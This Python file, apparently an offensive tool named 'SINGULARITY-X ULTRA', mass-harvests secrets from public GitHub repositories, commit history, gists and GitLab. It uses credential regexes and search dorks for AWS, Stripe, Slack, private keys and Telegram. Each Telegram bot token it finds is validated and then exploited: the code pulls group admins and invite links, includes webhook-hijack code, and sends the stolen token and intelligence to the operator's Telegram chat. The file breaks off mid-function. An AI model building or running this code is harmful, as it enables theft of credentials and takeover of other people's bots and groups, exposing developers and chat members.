#!/usr/bin/env python3
"""
SINGULARITY-X ULTRA v2.0 - Advanced Token Scanner & Exploitation Framework
Enhanced for maximum discovery and intelligence gathering
"""

import asyncio
import aiohttp
import re
import base64
import random
import json
import sqlite3
import hashlib
import hmac
import time
import os
from datetime import datetime
from urllib.parse import quote, urlparse
from concurrent.futures import ThreadPoolExecutor
from telethon import TelegramClient
from telethon.tl.functions.messages import ExportChatInviteRequest
from aiolimiter import AsyncLimiter
from dataclasses import dataclass, asdict
from typing import List, Dict, Set, Optional, Tuple
import aiofiles

# Try to import config, create template if not exists
try:
    from config import Config
except ImportError:
    print("[!] Config not found. Create config.py with required settings.")
    exit(1)

# =============================================================================
# CONFIGURATION & GLOBALS
# =============================================================================

@dataclass
class ScanConfig:
    """Advanced configuration dataclass"""
    # Rate limiting - Ultra aggressive with smart backoff
    REQUESTS_PER_SECOND: int = 5000
    GITHUB_RATE_LIMIT_BUFFER: int = 100
    MAX_RETRIES: int = 5
    RETRY_DELAY_BASE: float = 2.0
    
    # Concurrency
    MAX_CONCURRENT_REQUESTS: int = 500
    MAX_CONCURRENT_DEEP_SCANS: int = 100
    BATCH_SIZE: int = 50
    
    # Scanning depth
    DEEP_BLAME_DEPTH: int = 50  # Commits to analyze
    HISTORICAL_YEARS: int = 3
    MAX_FILE_SIZE_MB: int = 10
    
    # Detection
    MIN_TOKEN_ENTROPY: float = 3.5
    CONFIDENCE_THRESHOLD: float = 0.7

SCAN_CFG = ScanConfig()

# Enhanced token patterns - Multi-platform
TOKEN_PATTERNS = {
    # Telegram
    'telegram_bot': r'[0-9]{8,10}:[a-zA-Z0-9_-]{35,40}',
    'telegram_api_id': r'api_id["\']?\s*[:=]\s*["\']?([0-9]{5,8})',
    'telegram_api_hash': r'api_hash["\']?\s*[:=]\s*["\']?([a-f0-9]{32})',
    
    # Cloud Providers
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret_key': r'["\']?(aws|secret)["\']?\s*[:=]\s*["\']?[a-zA-Z0-9/+=]{40}',
    'aws_mws_auth_token': r'amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
    'google_api': r'AIza[0-9A-Za-z_-]{35}',
    'google_oauth': r'[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com',
    'google_service_account': r'"type":\s*"service_account"',
    'azure_key': r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
    'heroku_api': r'[hH][eE][rR][oO][kK][uU].*[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}',
    
    # Communication Platforms
    'slack_token': r'xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24}',
    'slack_webhook': r'https://hooks\.slack\.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8,}/[a-zA-Z0-9_]{24}',
    'discord_token': r'[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}',
    'discord_webhook': r'https://discord\.com/api/webhooks/[0-9]{18,20}/[a-zA-Z0-9_-]{68}',
    'twilio_sid': r'SK[0-9a-f]{32}',
    'twilio_token': r'[0-9a-f]{32}',
    
    # Financial/Crypto
    'stripe_key': r'sk_live_[0-9a-zA-Z]{24}',
    'stripe_test': r'sk_test_[0-9a-zA-Z]{24}',
    'paypal_key': r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
    'bitcoin_wif': r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}',
    'ethereum_private': r'0x[a-fA-F0-9]{64}',
    'crypto_private': r'[a-zA-Z0-9]{64}',
    
    # Generic API Keys
    'generic_api_key': r'[aA][pP][iI]_?[kK][eE][yY]["\']?\s*[:=]\s*["\']?[a-zA-Z0-9_-]{32,64}',
    'generic_secret': r'[sS][eE][cC][rR][eE][tT]["\']?\s*[:=]\s*["\']?[a-zA-Z0-9_-]{16,64}',
    'bearer_token': r'bearer\s+[a-zA-Z0-9_\-\.=]{20,100}',
    'basic_auth': r'basic\s+[a-zA-Z0-9=]{20,100}',
    'jwt_token': r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
    
    # Database
    'mysql_conn': r'mysql://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'postgres_conn': r'postgres(ql)?://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'mongodb_conn': r'mongodb(\+srv)?://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'redis_conn': r'redis://[^\s\"]+:[^\s\"]+@[^\s\"]+',
    'connection_string': r'Data\s+Source=[^;]+;Initial\s+Catalog=[^;]+;User\s+ID=[^;]+;Password=[^;\'"]+',
    
    # SSH/Private Keys
    'ssh_private': r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----',
    'pem_private': r'-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END',
    'putty_key': r'PuTTY-User-Key-File-',
    
    # Configuration files content patterns
    'password_in_code': r'(?i)(password|passwd|pwd)\s*[=:]\s*["\'][^"\']{4,50}["\']',
    'api_key_in_code': r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\'][^"\']{8,64}["\']',
}

# Enhanced file extensions
EXTENSIONS = [
    'env', 'php', 'js', 'json', 'yml', 'yaml', 'py', 'sh', 'sql', 'ini', 'conf', 
    'bak', 'backup', 'txt', 'log', 'config', 'properties', 'xml', 'toml', 'ini',
    'dockerfile', 'tf', 'tfvars', 'ppk', 'pem', 'key', 'p12', 'pfx', 'crt', 'cer',
    'htaccess', 'htpasswd', 'local', 'development', 'production', 'staging',
    'secret', 'secrets', 'credential', 'credentials', 'token', 'tokens'
]

# Enhanced keywords for search
KEYWORDS = [
    'bot_token', 'tg_token', 'api_key', 'api_secret', 'secret_key', 'private_key',
    'password', 'passwd', 'credential', 'auth_token', 'access_token', 'bearer',
    'aws_access_key', 'aws_secret', 'github_token', 'gitlab_token', 'docker_auth',
    'stripe_key', 'paypal', 'twilio', 'sendgrid', 'firebase', 'mongodb_uri',
    'connection_string', 'database_url', 'redis_url', 'elasticsearch',
    'oauth', 'jwt_secret', 'encryption_key', 'session_secret', 'app_secret'
]

# GitHub search dorks - Advanced queries
GITHUB_DORKS = [
    'extension:env DB_PASSWORD',
    'extension:env DATABASE_URL',
    'extension:yml password',
    'extension:yaml secret',
    'extension:json api_key',
    'extension:py BOT_TOKEN',
    'extension:php mysql_connect',
    'extension:js password =',
    'extension:sh export AWS',
    'extension:tfvars',
    'filename:.htpasswd',
    'filename:.netrc',
    'filename:_netrc',
    'filename:.npmrc _auth',
    'filename:.dockercfg auth',
    'filename:id_rsa',
    'filename:id_dsa',
    'filename:.keystore',
    'filename:.p12',
    'filename:.pfx',
    'path:.env',
    'path:config/database.yml',
    'filename:credentials.yml',
    'extension:log password',
    'extension:log api_key',
]

# Global state
PROCESSED_TOKENS: Set[str] = set()
PROCESSED_URLS: Set[str] = set()
RATE_LIMIT_HITS: Dict[str, float] = {}
STATS = {
    'requests_made': 0,
    'tokens_found': 0,
    'valid_tokens': 0,
    'errors': 0,
    'start_time': None
}

# =============================================================================
# DATABASE LAYER
# =============================================================================

class TokenDatabase:
    """SQLite database for persistent token storage and intelligence"""
    
    def __init__(self, db_path: str = "singularity_intel.db"):
        self.db_path = db_path
        self.init_db()
    
    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        # Main tokens table
        c.execute('''CREATE TABLE IF NOT EXISTS tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token_hash TEXT UNIQUE,
            token_type TEXT,
            raw_token TEXT,
            source_url TEXT,
            source_method TEXT,
            found_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            validated INTEGER DEFAULT 0,
            validation_response TEXT,
            bot_username TEXT,
            bot_id TEXT,
            associated_groups TEXT,
            webhook_set INTEGER DEFAULT 0,
            exploited INTEGER DEFAULT 0,
            severity TEXT DEFAULT 'unknown'
        )''')
        
        # Groups/Channels discovered
        c.execute('''CREATE TABLE IF NOT EXISTS groups (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token_hash TEXT,
            chat_id TEXT,
            chat_type TEXT,
            title TEXT,
            invite_link TEXT,
            member_count INTEGER,
            admins TEXT,
            discovered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (token_hash) REFERENCES tokens(token_hash)
        )''')
        
        # Scan statistics
        c.execute('''CREATE TABLE IF NOT EXISTS scan_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            scan_type TEXT,
            target TEXT,
            status TEXT,
            items_found INTEGER DEFAULT 0,
            scanned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        # Repository intelligence
        c.execute('''CREATE TABLE IF NOT EXISTS repos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            full_name TEXT UNIQUE,
            owner TEXT,
            language TEXT,
            stars INTEGER,
            forks INTEGER,
            private INTEGER,
            scanned_commits INTEGER DEFAULT 0,
            last_scanned TIMESTAMP,
            tokens_found INTEGER DEFAULT 0
        )''')
        
        conn.commit()
        conn.close()
    
    def insert_token(self, token: str, token_type: str, source: str, method: str) -> bool:
        """Insert new token, return True if new, False if duplicate"""
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        try:
            c.execute('''INSERT INTO tokens 
                (token_hash, token_type, raw_token, source_url, source_method)
                VALUES (?, ?, ?, ?, ?)''',
                (token_hash, token_type, token, source, method))
            conn.commit()
            conn.close()
            return True
        except sqlite3.IntegrityError:
            conn.close()
            return False
    
    def update_validation(self, token: str, valid: bool, response: dict):
        """Update token validation status"""
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        bot_data = response.get('result', {})
        c.execute('''UPDATE tokens SET 
            validated = ?,
            validation_response = ?,
            bot_username = ?,
            bot_id = ?,
            severity = ?
            WHERE token_hash = ?''',
            (1 if valid else 0, 
             json.dumps(response),
             bot_data.get('username'),
             str(bot_data.get('id')),
             'critical' if valid else 'invalid',
             token_hash))
        conn.commit()
        conn.close()
    
    def insert_group(self, token: str, chat_id: str, chat_type: str, 
                     title: str, invite_link: str = None, member_count: int = 0):
        """Store discovered group/channel"""
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO groups 
            (token_hash, chat_id, chat_type, title, invite_link, member_count)
            VALUES (?, ?, ?, ?, ?, ?)''',
            (token_hash, chat_id, chat_type, title, invite_link, member_count))
        conn.commit()
        conn.close()
    
    def get_stats(self) -> dict:
        """Get comprehensive statistics"""
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        
        stats = {}
        c.execute('SELECT COUNT(*) FROM tokens')
        stats['total_tokens'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM tokens WHERE validated = 1')
        stats['valid_tokens'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM tokens WHERE exploited = 1')
        stats['exploited_tokens'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM groups')
        stats['total_groups'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM repos')
        stats['repos_scanned'] = c.fetchone()[0]
        
        conn.close()
        return stats

db = TokenDatabase()

# =============================================================================
# TELEGRAM EXPLOITATION MODULE
# =============================================================================

class TelegramExploiter:
    """Advanced Telegram bot exploitation capabilities"""
    
    def __init__(self):
        self.exploited_count = 0
    
    async def validate_token(self, session: aiohttp.ClientSession, token: str) -> Tuple[bool, dict]:
        """Validate token and return bot info"""
        async with limiter:
            try:
                async with session.get(
                    f"https://api.telegram.org/bot{token}/getMe",
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as r:
                    if r.status == 200:
                        data = await r.json()
                        return data.get('ok', False), data
                    return False, {}
            except Exception as e:
                return False, {'error': str(e)}
    
    async def get_updates(self, session: aiohttp.ClientSession, token: str, limit: int = 100) -> dict:
        """Get bot updates for intelligence"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getUpdates?limit={limit}",
                timeout=aiohttp.ClientTimeout(total=15)
            ) as r:
                if r.status == 200:
                    return await r.json()
                return {}
        except:
            return {}
    
    async def get_chat_info(self, session: aiohttp.ClientSession, token: str, chat_id) -> dict:
        """Get detailed chat information"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getChat?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    return await r.json()
                return {}
        except:
            return {}
    
    async def get_chat_admins(self, session: aiohttp.ClientSession, token: str, chat_id) -> list:
        """Get chat administrators"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getChatAdministrators?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result', [])
                return []
        except:
            return []
    
    async def get_chat_member_count(self, session: aiohttp.ClientSession, token: str, chat_id) -> int:
        """Get member count for groups/channels"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getChatMemberCount?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result', 0)
                return 0
        except:
            return 0
    
    async def export_invite_link(self, session: aiohttp.ClientSession, token: str, chat_id) -> Optional[str]:
        """Try to export invite link"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/exportChatInviteLink?chat_id={chat_id}",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('result')
                return None
        except:
            return None
    
    async def set_webhook(self, session: aiohttp.ClientSession, token: str, webhook_url: str) -> bool:
        """Set webhook on compromised bot (for monitoring/interception)"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/setWebhook?url={webhook_url}",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('ok', False)
                return False
        except:
            return False
    
    async def delete_webhook(self, session: aiohttp.ClientSession, token: str) -> bool:
        """Delete webhook from bot"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/deleteWebhook",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('ok', False)
                return False
        except:
            return False
    
    async def get_webhook_info(self, session: aiohttp.ClientSession, token: str) -> dict:
        """Get current webhook information"""
        try:
            async with session.get(
                f"https://api.telegram.org/bot{token}/getWebhookInfo",
                timeout=aiohttp.ClientTimeout(total=10)
            ) as r:
                if r.status == 200:
                    return await r.json()
                return {}
        except:
            return {}
    
    async def send_message(self, session: aiohttp.ClientSession, token: str, 
                          chat_id, text: str) -> bool:
        """Send message via compromised bot"""
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
            async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    return data.get('ok', False)
                return False
        except:
            return False
    
    async def exploit_bot(self, session: aiohttp.ClientSession, token: str, 
                         source: str, method: str) -> dict:
        """Full exploitation chain for discovered token"""
        global PROCESSED_TOKENS
        
        if token in PROCESSED_TOKENS:
            return {}
        PROCESSED_TOKENS.add(token)
        
        # Check if already in DB
        token_hash = hashlib.sha256(token.encode()).hexdigest()[:32]
        conn = sqlite3.connect(db.db_path)
        c = conn.cursor()
        c.execute('SELECT validated FROM tokens WHERE token_hash = ?', (token_hash,))
        existing = c.fetchone()
        conn.close()
        
        if existing and existing[0]:
            return {}
        
        # Validate token
        is_valid, bot_info = await self.validate_token(session, token)
        
        if not is_valid:
            db.insert_token(token, 'telegram_bot', source, method)
            db.update_validation(token, False, bot_info)
            return {}
        
        # Valid token found!
        STATS['valid_tokens'] += 1
        db.insert_token(token, 'telegram_bot', source, method)
        db.update_validation(token, True, bot_info)
        
        bot_data = bot_info.get('result', {})
        bot_username = bot_data.get('username', 'unknown')
        bot_name = bot_data.get('first_name', 'Unknown')
        bot_id = bot_data.get('id', 0)
        can_join = bot_data.get('can_join_groups', False)
        can_read_all = bot_data.get('can_read_all_group_messages', False)
        
        print(f"[🔥] VALID BOT: @{bot_username} (ID: {bot_id})")
        
        # Intelligence gathering
        intelligence = {
            'bot_username': bot_username,
            'bot_id': bot_id,
            'groups': [],
            'admins': [],
            'invite_links': [],
            'messages': []
        }
        
        # Get updates for group discovery
        updates = await self.get_updates(session, token, limit=100)
        processed_chats = set()
        
        if updates.get('ok'):
            for update in updates.get('result', []):
                # Extract messages for intelligence
                if 'message' in update:
                    msg = update['message']
                    chat = msg.get('chat', {})
                    chat_id = chat.get('id')
                    
                    if chat_id and chat_id not in processed_chats:
                        processed_chats.add(chat_id)
                        
                        chat_type = chat.get('type', 'unknown')
                        chat_title = chat.get('title') or chat.get('username') or f"Private_{chat_id}"
                        
                        # Get detailed info
                        chat_info = await self.get_chat_info(session, token, chat_id)
                        member_count = await self.get_chat_member_count(session, token, chat_id)
                        invite_link = await self.export_invite_link(session, token, chat_id)
                        
                        # Get admins for groups
                        admins = []
                        if chat_type in ['group', 'supergroup', 'channel']:
                            admin_list = await self.get_chat_admins(session, token, chat_id)
                            for admin in admin_list:
                                user = admin.get('user', {})
                                admins.append({
                                    'id': user.get('id'),
                                    'username': user.get('username'),
                                    'status': admin.get('status'),
                                    'is_bot': user.get('is_bot', False)
                                })
                        
                        group_data = {
                            'chat_id': chat_id,
                            'type': chat_type,
                            'title': chat_title,
                            'invite_link': invite_link,
                            'member_count': member_count,
                            'admins': admins,
                            'description': chat_info.get('result', {}).get('description', ''),
                            'linked_chat': chat_info.get('result', {}).get('linked_chat_id')
                        }
                        
                        intelligence['groups'].append(group_data)
                        db.insert_group(token, str(chat_id), chat_type, chat_title, invite_link, member_count)
                        
                        if invite_link:
                            intelligence['invite_links'].append(f"{chat_title}: {invite_link}")
        
        # Build comprehensive report
        report = self._build_report(token, bot_data, intelligence, source, method)
        
        # Send report via Telegram
        await self._send_report(report)
        
        # Save to file
        await self._save_report(token_hash, report)
        
        return intelligence
    
    def _build_report(self, token: str, bot_data: dict, intel: dict, source: str, method: str) -> str:
        """Build detailed markdown report"""
        report = []
        report.append("═" * 60)
        report.append("🔥 **SINGULARITY-X ULTRA - CRITICAL HIT** 🔥")
        report.append("═" * 60)
        report.append(f"\n📊 **Bot Information:**")
        report.append(f"  👤 Username: @{bot_data.get('username', 'N/A')}")
        report.append(f"  📝 Name: {bot_data.get('first_name', 'N/A')}")
        report.append(f"  🆔 ID: `{bot_data.get('id', 'N/A')}`")
        report.append(f"  🤖 Is Bot: {bot_data.get('is_bot', True)}")
        report.append(f"  🔓 Can Join Groups: {bot_data.get('can_join_groups', False)}")
        report.append(f"  👁️ Can Read All Messages: {bot_data.get('can_read_all_group_messages', False)}")
        report.append(f"  ✅ Supports Inline Queries: {bot_data.get('supports_inline_queries', False)}")
        
        report.append(f"\n🔑 **Token:**")
        report.append(f"  `{token}`")
        
        report.append(f"\n🔗 **Source:**")
        report.append(f"  Method: {method}")
        report.append(f"  URL: {source}")
        report.append(f"  Time: {datetime.now().isoformat()}")
        
        report.append(f"\n🏰 **Discovered Groups/Channels ({len(intel['groups'])}):**")
        for group in intel['groups']:
            report.append(f"\n  📢 {group['title']} (`{group['type']}`)")
            report.append(f"     ID: `{group['chat_id']}`")
            report.append(f"     Members: {group['member_count']}")
            if group['invite_link']:
                report.append(f"     🔗 Invite: {group['invite_link']}")
            if group['description']:
                report.append(f"     📝 {group['description'][:100]}")
            if group['linked_chat']:
                report.append(f"     🔗 Linked Chat: `{group['linked_chat']}`")
            
            if group['admins']:
                report.append(f"     👥 Admins ({len(group['admins'])}):")
                for admin in group['admins'][:5]:  # Show first 5 admins
                    report.append(f"       - @{admin.get('username', 'N/A')} ({admin.get('status', 'N/A')})")
        
        if not intel['groups']:
            report.append("  No groups accessible (bot may not be in any)")
        
        report.append("\n" + "═" * 60)
        report.append("⚠️ **EXPLOITATION NOTES:**")
        if bot_data.get('can_read_all_group_messages'):
            report.append("  🔴 CRITICAL: Bot can read ALL group messages!")
        if intel['invite_links']:
            report.append(f"  🔴 {len(intel['invite_links'])} invite links extracted!")
        
        report.append("\n💀 End of Report")
        report.append("═" * 60)
        
        return "\n".join(report)
    
    async def _send_report(self, report: str):
        """Send report to configured channels"""
        try:
            # Split if too long
            if len(report) > 4000:
                chunks = [report[i:i+4000] for i in range(0, len(report), 4000)]
                for chunk in chunks:
                    await client.send_message(Config.LOG_CHAT, f"```\n{chunk}\n```")
            else:
                await client.send_message(Config.LOG_CHAT, f"```\n{report}\n```")
        except Exception as e:
            print(f"[✗] Failed to send report: {e}")
    
    async def _save_report(self, token_hash: str, report: str):
        """Save report to file"""
        try:
            os.makedirs('reports', exist_ok=True)
            filename = f"reports/{token_hash}_{int(time.time())}.md"
            async with aiofiles.open(filename, 'w') as f:
                await f.write(report)
            print(f"[✓] Report saved: {filename}")
        except Exception as e:
            print(f"[✗] Failed to save report: {e}")

exploiter = TelegramExploiter()

# =============================================================================
# ADVANCED GITHUB SCANNER
# =============================================================================

class GitHubScanner:
    """Advanced GitHub code and intelligence scanner"""
    
    def __init__(self):
        self.token_rotation_index = 0
        self.failed_tokens = set()
    
    def get_token(self) -> str:
        """Get next GitHub token with rotation"""
        tokens = [t for t in Config.GH_TOKENS if t not in self.failed_tokens]
        if not tokens:
            self.failed_tokens.clear()
            tokens = Config.GH_TOKENS
        
        token = tokens[self.token_rotation_index % len(tokens)]
        self.token_rotation_index += 1
        return token.strip()
    
    async def make_request(self, session: aiohttp.ClientSession, url: str, 
                          retries: int = 0) -> Tuple[int, dict]:
        """Make rate-limited GitHub API request with smart retry"""
        if retries >= SCAN_CFG.MAX_RETRIES:
            return 0, {}
        
        token = self.get_token()
        headers = {
            "Authorization": f"token {token}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Singularity-X-Scanner/2.0"
        }
        
        async with limiter:
            try:
                async with session.get(url, headers=headers, 
                                       timeout=aiohttp.ClientTimeout(total=30)) as r:
                    STATS['requests_made'] += 1
                    
                    if r.status == 401:
                        self.failed_tokens.add(token)
                        return await self.make_request(session, url, retries + 1)
                    
                    if r.status == 403:
                        # Rate limited - check reset time
                        reset_time = int(r.headers.get('X-RateLimit-Reset', 0))
                        if reset_time > time.time():
                            wait = min(reset_time - time.time(), 60)
                            await asyncio.sleep(wait)
                        return await self.make_request(session, url, retries + 1)
                    
                    if r.status == 200:
                        return r.status, await r.json()
                    
                    return r.status, {}
                    
            except asyncio.TimeoutError:
                await asyncio.sleep(SCAN_CFG.RETRY_DELAY_BASE * (retries + 1))
                return await self.make_request(session, url, retries + 1)
            except Exception as e:
                STATS['errors'] += 1
                await asyncio.sleep(SCAN_CFG.RETRY_DELAY_BASE)
                return await self.make_request(session, url, retries + 1)
    
    async def scan_code_search(self, session: aiohttp.ClientSession, query: str) -> List[dict]:
        """Execute GitHub code search with pagination"""
        results = []
        for page in range(1, 6):  # Max 5 pages (GitHub limit)
            url = f"https://api.github.com/search/code?q={quote(query)}&sort=indexed&order=desc&per_page=100&page={page}"
            status, data = await self.make_request(session, url)
            
            if status == 200:
                items = data.get('items', [])
                if not items:
                    break
                results.extend(items)
                
                # Store repo info
                for item in items:
                    repo = item.get('repository', {})
                    await self._store_repo_info(repo)
            else:
                break
        
        return results
    
    async def scan_events(self, session: aiohttp.ClientSession) -> List[dict]:
        """Monitor real-time GitHub events"""
        url = "https://api.github.com/events"
        status, data = await self.make_request(session, url)
        
        if status == 200:
            return data
        return []
    
    async def get_commit_details(self, session: aiohttp.ClientSession, 
                                  commit_url: str) -> dict:
        """Get detailed commit information with file patches"""
        status, data = await self.make_request(session, commit_url)
        if status == 200:
            return data
        return {}
    
    async def get_commit_history(self, session: aiohttp.ClientSession, 
                                  repo: str, path: str, depth: int = None) -> List[dict]:
        """Get commit history for a file"""
        depth = depth or SCAN_CFG.DEEP_BLAME_DEPTH
        url = f"https://api.github.com/repos/{repo}/commits?path={quote(path)}&per_page={min(depth, 100)}"
        status, data = await self.make_request(session, url)
        
        if status == 200 and isinstance(data, list):
            return data
        return []
    
    async def get_raw_file(self, session: aiohttp.ClientSession, 
                           repo: str, sha: str, path: str) -> str:
        """Get raw file content from specific commit"""
        url = f"https://raw.githubusercontent.com/{repo}/{sha}/{path}"
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as r:
                if r.status == 200:
                    return await r.text()
                return ""
        except:
            return ""
    
    async def get_repo_contents(self, session: aiohttp.ClientSession, 
                                 repo: str, path: str = "") -> List[dict]:
        """Get repository contents recursively"""
        url = f"https://api.github.com/repos/{repo}/contents/{path}"
        status, data = await self.make_request(session, url)
        
        if status == 200:
            return data if isinstance(data, list) else []
        return []
    
    async def deep_blame_analysis(self, session: aiohttp.ClientSession, 
                                   item: dict, exploiter: TelegramExploiter) -> int:
        """Deep analysis of file history for all token types"""
        repo = item.get('repository', {}).get('full_name')
        path = item.get('path')
        html_url = item.get('html_url', '')
        
        if not repo or not path:
            return 0
        
        found_count = 0
        commits = await self.get_commit_history(session, repo, path)
        
        for commit in commits[:SCAN_CFG.DEEP_BLAME_DEPTH]:
            sha = commit.get('sha')
            if not sha:
                continue
            
            # Get file content at this commit
            content = await self.get_raw_file(session, repo, sha, path)
            
            if not content or len(content) > SCAN_CFG.MAX_FILE_SIZE_MB * 1024 * 1024:
                continue
            
            # Search all patterns
            for token_type, pattern in TOKEN_PATTERNS.items():
                matches = set(re.findall(pattern, content))
                
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0] if match else ""
                    
                    if not match or len(match) < 10:
                        continue
                    
                    found_count += 1
                    STATS['tokens_found'] += 1
                    
                    # Check if Telegram bot token
                    if token_type == 'telegram_bot':
                        await exploiter.exploit_bot(session, match, html_url, f"DEEP_BLAME:{sha[:7]}")
                    else:
                        # Store other secrets
                        db.insert_token(match, token_type, html_url, f"DEEP_BLAME:{sha[:7]}")
        
        return found_count
    
    async def _store_repo_info(self, repo: dict):
        """Store repository intelligence"""
        try:
            conn = sqlite3.connect(db.db_path)
            c = conn.cursor()
            c.execute('''INSERT OR REPLACE INTO repos 
                (full_name, owner, language, stars, forks, private, last_scanned)
                VALUES (?, ?, ?, ?, ?, ?, ?)''',
                (repo.get('full_name'),
                 repo.get('owner', {}).get('login'),
                 repo.get('language'),
                 repo.get('stargazers_count', 0),
                 repo.get('forks_count', 0),
                 1 if repo.get('private') else 0,
                 datetime.now().isoformat()))
            conn.commit()
            conn.close()
        except:
            pass

gh_scanner = GitHubScanner()

# =============================================================================
# MULTI-PLATFORM SCANNER
# =============================================================================

class MultiPlatformScanner:
    """Scan additional platforms beyond GitHub"""
    
    async def scan_gitlab(self, session: aiohttp.ClientSession, exploiter: TelegramExploiter):
        """Scan GitLab for exposed secrets"""
        if not hasattr(Config, 'GITLAB_TOKENS') or not Config.GITLAB_TOKENS:
            return
        
        gitlab_patterns = [
            'bot_token',
            'api_key',
            'private_key',
            'password'
        ]
        
        for token in Config.GITLAB_TOKENS:
            for pattern in gitlab_patterns:
                url = f"https://gitlab.com/api/v4/search?search={pattern}&scope=blobs"
                try:
                    headers = {"PRIVATE-TOKEN": token}
                    async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=30)) as r:
                        if r.status == 200:
                            data = await r.json()
                            for item in data:
                                # Process GitLab results
                                content = item.get('data', '')
                                for t in set(re.findall(TOKEN_PATTERNS['telegram_bot'], content)):
                                    await exploiter.exploit_bot(session, t, item.get('web_url', ''), "GITLAB")
                except:
                    continue
    
    async def scan_pastebin_alternatives(self, session: aiohttp.ClientSession, 
                                          exploiter: TelegramExploiter):
        """Monitor paste sites for exposed tokens"""
        # Pastebin-style sites to monitor
        paste_sites = [
            'https://pastecode.io/raw/',
            'https://paste.ubuntu.com/plain/',
            'https://paste.mozilla.org/',
        ]
        
        # This would need specific implementation per site
        # Placeholder for expansion
        pass
    
    async def scan_gists(self, session: aiohttp.ClientSession, exploiter: TelegramExploiter):
        """Scan public GitHub gists"""
        # Get recent gists
        url = "https://api.github.com/gists/public?per_page=100"
        status, data = await gh_scanner.make_request(session, url)
        
        if status == 200:
            for gist in data:
                files = gist.get('files', {})
                for filename, fileinfo in files.items():
                    raw_url = fileinfo.get('raw_url', '')
                    if raw_url:
                        try:
                            async with session.get(raw_url, timeout=aiohttp.ClientTimeout(total=15)) as r:
                                if r.status == 200:
                                    content = await r.text()
                                    for t in set(re.findall(TOKEN_PATTERNS['telegram_bot'], content)):
                                        await exploiter.exploit_bot(session, t, gist.get('html_url', ''), "GIST")
                        except:
                            continue

multi_scanner = MultiPlatformScanner()

# =============================================================================
# MAIN ENGINE
# =============================================================================

# Rate limiter - Ultra aggressive
limiter = AsyncLimiter(SCAN_CFG.REQUESTS_PER_SECOND, 1)

# Initialize Telegram client
client = TelegramClient('singularity_x_enhanced', Config.API_ID, Config.API_HASH)

async def realtime_monitor(session: aiohttp.ClientSession, exploiter: TelegramExploiter):
    """Real-time GitHub events monitoring"""
    print("[🔄] Real-time monitor started")
    
    while True:
        try:
            events = await gh_scanner.scan_events(session)
            
            tasks = []
            for event in events:
                event_type = event.get('type')
                
                if event_type == 'PushEvent':
